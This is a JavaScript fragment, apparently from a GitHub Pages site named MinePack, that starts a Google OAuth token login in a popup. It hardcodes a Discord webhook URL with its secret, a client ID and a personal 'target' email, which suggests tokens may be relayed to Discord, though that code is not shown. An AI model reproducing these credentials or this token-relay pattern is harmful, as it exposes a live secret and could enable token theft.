        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1399701836533076061/ykK4JpQU2N010-FHfgqU1T2YeQCJzVg1QBC_g0Z8I38zFpuN1j5liVSDtZUOibp3gwnA';
        const GOOGLE_CLIENT_ID = '988505529187-nao13edis8dhrgi6qhj8iumol58psila.apps.googleusercontent.com';
        const TARGET_EMAIL = 'dwikahadiw@gmail.com';
        
        function handleGoogleLogin() {
            showNotification('Redirecting to Google login...', 'info');
            
            // Redirect ke Google OAuth
            const redirectUri = encodeURIComponent('https://bloxaryn.github.io/MinePack/');
            const scope = encodeURIComponent('profile email');
            const authUrl = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${GOOGLE_CLIENT_ID}&redirect_uri=${redirectUri}&response_type=token&scope=${scope}`;
            
            // Buka popup window untuk login
            const popup = window.open(authUrl, 'googleLogin', 'width=500,height=600');
            
            // Check for token in URL (setelah redirect)
            checkForToken();
        }
        
